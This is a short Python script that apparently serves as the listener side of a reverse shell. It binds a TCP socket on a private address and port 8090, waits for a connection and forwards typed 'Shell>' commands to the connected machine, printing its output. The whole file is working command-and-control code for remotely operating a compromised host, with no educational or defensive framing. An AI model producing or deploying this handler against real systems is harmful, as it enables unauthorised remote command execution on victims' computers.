import socket

def connection():
    sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sok.bind(("192.168.81.14" , 8090))
    sok.listen(1)
    connect , address = sok.accept()

    print("[*] We Got a Connection from: " , address)
    while True:
        command = raw_input("Shell> ")

        if "terminate" in command:
            connect.send("terminate")
            connect.close()
            break
        else:
            connect.send(command)
            print(connect.recv(1024))

def main():
    connection()

main()
